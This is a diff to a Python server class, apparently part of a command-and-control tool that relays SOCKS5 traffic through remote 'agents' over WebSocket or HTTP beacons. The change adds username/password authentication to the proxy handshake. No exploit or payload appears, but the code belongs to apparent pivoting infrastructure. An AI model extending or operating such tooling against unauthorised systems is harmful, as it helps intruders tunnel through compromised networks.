@@ -1583,7 +1583,7 @@ class SockPuppetsServer:
             encrypted = self.simple_encrypt(json.dumps(message), agent.encryption_key)
             await agent.websocket.send(encrypted)
 
-    async def start_socks_proxy(self, agent_id: str, local_port: int) -> str:
+    async def start_socks_proxy(self, agent_id: str, local_port: int, socks_user: str = None, socks_pass: str = None) -> str:
         """Start SOCKS5 proxy through agent (WebSocket or HTTP beacon)"""
         if agent_id not in self.agents:
             return "Agent not found"
@@ -1598,6 +1598,8 @@ class SockPuppetsServer:
 
         try:
             agent.socks_proxy = local_port
+            agent.socks_user = socks_user
+            agent.socks_pass = socks_pass
             if not hasattr(agent, 'socks_pending_commands'):
                 agent.socks_pending_commands = asyncio.Queue()
             agent.socks_task = asyncio.create_task(self._run_socks_server(agent_id, local_port))
@@ -1656,9 +1658,39 @@ class SockPuppetsServer:
                 await writer.wait_closed()
                 return
 
-            # No authentication
-            writer.write(b'\x05\x00')
-            await writer.drain()
+            if agent.socks_user and agent.socks_pass:
+                # Require username/password auth (RFC 1929)
+                methods = data[2:2+data[1]]
+                if 0x02 not in methods:
+                    writer.write(b'\x05\xFF')
+                    await writer.drain()
+                    writer.close()
+                    await writer.wait_closed()
+                    return
+                writer.write(b'\x05\x02')
+                await writer.drain()
+                auth_data = await reader.read(513)
+                if len(auth_data) < 3 or auth_data[0] != 0x01:
+                    writer.write(b'\x01\x01')
+                    await writer.drain()
+                    writer.close()
+                    await writer.wait_closed()
+                    return
+                ulen = auth_data[1]
+                uname = auth_data[2:2+ulen].decode('utf-8', errors='replace')
+                plen = auth_data[2+ulen]
+                passwd = auth_data[3+ulen:3+ulen+plen].decode('utf-8', errors='replace')
+                if uname != agent.socks_user or passwd != agent.socks_pass:
+                    writer.write(b'\x01\x01')
+                    await writer.drain()
+                    writer.close()
+                    await writer.wait_closed()
+                    return
+                writer.write(b'\x01\x00')
+                await writer.drain()
+            else:
+                writer.write(b'\x05\x00')
+                await writer.drain()
 
             # Get request
             data = await reader.read(4)
